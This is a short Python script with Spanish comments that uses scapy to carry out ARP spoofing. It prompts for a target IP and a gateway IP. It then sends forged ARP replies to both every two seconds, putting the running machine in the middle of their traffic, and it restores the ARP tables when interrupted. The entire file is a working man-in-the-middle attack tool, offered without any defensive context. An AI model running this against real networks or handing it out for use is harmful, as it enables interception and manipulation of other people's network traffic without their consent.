from scapy.all import *
import time

#******************Obtener direccion MAC*************
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

#*******************Enviar paquete ARP falso********************
def spoofing(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Error: No se pudo obtener la dirección MAC de {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

#******************Restaura la tabla arp original*****
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if not destination_mac or not source_mac:
        print("Error: No se pudo restaurar la tabla ARP original.")
        return
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)

try:
    target_ip = input("Ingresar IP de destino: ")
    gateway_ip = input("Ingresar IP del router: ")

    print("Iniciando ARP spoofing...")
    while True:
        spoofing(target_ip, gateway_ip)
        spoofing(gateway_ip, target_ip)
        time.sleep(2)

except KeyboardInterrupt:
    print("\nDeteniendo ARP spoofing y restaurando la red...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("Red restaurada.")
